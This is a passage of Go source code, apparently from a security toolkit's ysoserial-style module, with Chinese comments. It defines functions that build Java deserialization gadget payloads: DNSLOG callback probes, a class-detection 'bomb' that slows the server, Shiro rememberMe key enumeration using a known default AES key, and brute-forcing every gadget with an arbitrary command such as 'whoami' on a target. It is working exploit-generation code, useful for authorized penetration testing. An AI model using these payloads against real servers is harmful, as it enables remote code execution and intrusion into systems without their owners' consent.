	return GenerateGadget(string(GadgetURLDNS), "domain", url)
}

// GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
// 使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
// url：要在生成的Java对象中设置的URL字符串。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// url, token, _ = risk.NewDNSLogDomain()
// javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog查询失败
//	} else {
//	  if len(res) > 0{
//	   // dnslog查询成功
//	  }
//	}
//
// ```
func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetFindAllClassesByDNS), "dnslog", map[string]string{
		"domain": url,
	})
}

// GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
// 使用预定义的FindClassByBomb序列化模板，然后在序列化对象中替换预设的ClassName占位符为提供的ClassName字符串。
// className：要批判的目标服务器是否存在的Class Name值。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // 检测目标服务器是否存在 java.lang.String 类
// gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
// ```
func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
	return GenerateGadget(string(GadgetFindClassByBomb), "class", map[string]string{
		"class": className,
	})
}

// GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
// 主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。
// 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。
// Example:
// ```
// javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
// classBytes,_ = yso.ToBytes(javaObject)
// data = codec.PKCS5Padding(classBytes, 16)
// keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
// iv = []byte(ramdstr(16))
// cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
// payload = codec.EncodeBase64(append(iv, cipherText...))
// 发送 payload
// ```
func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
	return GenerateGadget(string(GadgetSimplePrincipalCollection))
}

// GetAllGadget 获取所有支持的Java反序列化Gadget。
// 这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。
// 对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；
// 对于不支持模板实现的Gadget，会创建一个接受命令字符串参数的函数。
// 返回：包含所有Gadget生成函数的接口切片。
// Example:
// ```
// allGadgets := yso.GetAllGadget()
//
//	for _, gadget := range allGadgets {
//	    switch g := gadget.(type) {
//	    case func(...GenClassOptionFun) (*JavaObject, error):
//	        // 处理模板实现的Gadget
//	        obj, err := g(yso.useRuntimeExecEvilClass("whoami"))
//	    case func(string) (*JavaObject, error):
//	        // 处理命令执行类型的Gadget
//	        obj, err := g("whoami")
//	    }
//	}
//
// ```
func GetAllGadget() []interface{} {
	var allGadget []any
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		var f any
		if cfg.IsTemplateImpl {
			f = func(options ...GenClassOptionFun) (*JavaObject, error) {
				anyOpts := []any{}
				for _, opt := range options {
					anyOpts = append(anyOpts, opt)
				}
				return GenerateGadget(string(name), anyOpts...)
			}
		} else {
			f = func(cmd string) (*JavaObject, error) {
				return GenerateGadget(string(name), "raw_cmd", cmd)
			}
		}
		allGadget = append(allGadget, f)
	}
	return allGadget
}

// GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget
// Example:
// ```
//
//	for _, gadget := range yso.GetAllTemplatesGadget() {
//		domain := "xxx.dnslog" // dnslog 地址
//		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
//		if javaObj == nil || err != nil {
//			continue
//		}
//		objBytes, err := yso.ToBytes(javaObj)
//		if err != nil {
//			continue
//		}
//		// 发送 objBytes
//	}
//
// ```
func GetAllTemplatesGadget() []TemplatesGadget {
	var allGadget []TemplatesGadget
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		if !cfg.IsTemplateImpl {
			continue
		}
		allGadget = append(allGadget, func(options ...GenClassOptionFun) (*JavaObject, error) {
			anyOpts := []any{}
			for _, opt := range options {
				anyOpts = append(anyOpts, opt)
			}
			return GenerateGadget(string(name), anyOpts...)
		})
	}
	return allGadget
}

// GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget
// Example:
// ```
//
//	command := "whoami" // 假设的命令字符串
//	for _, gadget := range yso.GetAllRuntimeExecGadget() {
//		javaObj, err := gadget(command)
//		if javaObj == nil || err != nil {
//			continue
//		}
//		objBytes, err := yso.ToBytes(javaObj)
//		if err != nil {
//			continue
//		}
//		// 发送 objBytes
//	}
//
// ```
func GetAllRuntimeExecGadget() []RuntimeExecGadget {
	var allGadget []RuntimeExecGadget
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		if cfg.IsTemplateImpl {
			continue
		}
		allGadget = append(allGadget, func(cmd string) (*JavaObject, error) {
			return GenerateGadget(string(name), "raw_cmd", cmd)
		})
	}
	return allGadget
}
